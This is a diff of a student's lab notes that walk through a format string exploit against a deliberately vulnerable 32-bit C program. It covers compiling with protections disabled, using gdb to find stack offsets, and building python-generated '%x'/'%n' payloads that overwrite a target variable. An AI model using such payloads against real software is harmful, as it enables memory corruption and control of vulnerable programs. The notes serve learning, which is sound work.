@@ -10,83 +10,95 @@
 ```
     gcc -g -o vuln vuln_s.c -m32 -fno-stack-protector -z execstack -fno-PIE -no-pie -g
 ```
+or (Im not sure this worked for me)
+```
+   gcc -g -o vuln vuln_s.c  $CFLAGS
+```
 4. Execute the file to ensure its working
-'''
+```
    ./vuln test
-'''
-Should return:
+```
+Expected output: ![Alt text](image.png)
 
-5. Opend program in debugger
-'''
+5. Open program in debugger
+```
     gdb vuln
-'''
-6. Run program with '%x' whitch will return data from the stack - the hexadecimal value of stack
-'''
+```
+6. Run the program with '%x' which will return data from the stack - the hexadecimal value of the stack
+```
     run %x
-'''
-Should return: ![Alt text](image-1.png)
-7. Add a brakepoint at line 16 (where the call is made from the main fucntion to the vuln function)
-'''
+```
+Expected output: ![Alt text](image-1.png)
+
+7. Add a breakpoint at line 14 (where the call is made from the **main** function to the **vuln** function)
+```
     break 14
-'''
-8. Run program again
-'''
+```
+8. Run the program again
+```
     run %x
-'''
-Shoudl return: ![Alt text](image-2.png)
-9. Check the contect on the %esp registers by running
-'''
+```
+Expected output:![Alt text](image-2.png)
+
+9. Check the content on the %esp registers by running
+```
     x/100x %esp
-'''
-Should return:
-    ![Alt text](image-3.png)
-10. So the str is located that 0xbffff789 and the '%x' value (0x4020e3fc) at 0xbffff550
-    The distance between str and %x is 0xbffff789 - 0xbffff550 = 569 (https://www.calculator.net/hex-calculator.html?number1=bffff789&c2op=-&number2=bffff550&calctype=op&x=50&y=20)
-    We want a number that is devisible by 4 (4 bytes) so will round 569 to 572 and then 572 / 4 = 143
-    That means that the 'target' varaible is around 143 positions away from the start of the stack
-    We can run a command that will pring us hexadecimal values up 143 places 
-'''
+```
+Should return: ![Alt text](image-3.png)
+
+10. So the **str** is located that **0xbffff789** and the '**%x'** value **(0x4020e3fc)** at **0xbffff550**
+    The distance between str and %x is **0xbffff789 - 0xbffff550 = 569** (https://www.calculator.net/hex-calculator.html?number1=bffff789&c2op=-&number2=bffff550&calctype=op&x=50&y=20)
+    We want a number that is divisible by 4 (4 bytes) so will round 569 to 572 and then 572 / 4 = 143
+    That means that the **'target'** variable is around 143 positions away from the start of the stack (in the bss section)
+    We can run a command that will bring us hexadecimal values up 143 stack positions
+
 11. Try and fail
-    Try 143 spaces and see if you can see 414141 (represention of AAAA)
-'''
+    Try 143 spaces and see if you can see **414141** (representation of AAAA)
+```
      run `(python -c 'print "AAAA" + ".%x." * 143+"%x"')`
-'''
-Output: ![Alt text](image-4.png)
+```
+
+The output will be something like this: ![Alt text](image-4.png)
+    
     Try to increase 143 to 146
-'''
+```
      run `(python -c 'print "AAAA" + ".%x." * 146+"%x"')`
-'''
-![Alt text](image-5.png)
-    Ok, I can now see the hexadecima representaion of AAAA but it is not at the end of the output, I need to get rid of the '00'
+```
+Output: ![Alt text](image-5.png)
+    Ok, I can now see the hexadecimal representaion of AAAA but it is not at the end of the output, I need to get rid of the '00' so that my last 4bits point exactly to AAAA
 
     Try with adding extra padding (BB)
-'''
+```
     run `(python -c 'print "AAAA" +"BBB"+ "%x." * 146+"%x"')`
-'''
+```
    ![Alt text](image-8.png)
-Ok, my string is now pointing to the hexadecimal represention of 'AAAA'
+ My pointer is now pointing to the hexadecimal representation of 'AAAA' exactly
 
 12. Replace AAAA with the address of the 'target' variable 
     To find the target variable type: '''p &target '''
-    The output should be: ![Alt text](image-7.png)
+    The output should be:![Alt text](image-7.png)
 
 13. Do the hack 
-- Replace the 'AAAA' in the run commant with the address (its read from the back for fun)
+- Replace the 'AAAA' in the run command with the address (its read from the back for fun)
 - replace last '%x' with '%n' (x is reading and n is writing)
-'''
+- run it
+```
     run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
-'''
-Output: ![Alt text](image-9.png)
-14. See value of taget chaning
+```
+Output:![Alt text](image-9.png)
+14. Extra: see the value of target changing
 - add break at line 5
 - add break at line 15
 - run run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
-- on first breakpoint type: print target - the value should be 0 
+- on the first breakpoint type: print target - the value should be 0 
 - type: '''next'''
 - type: '''next'''
 - print target - the value should be changed
 ![Alt text](image-10.png)
 
+
+##Outstanding questions
+- I still don't get the addresses and why if I change AAAA to the exact address it works
 
 
 
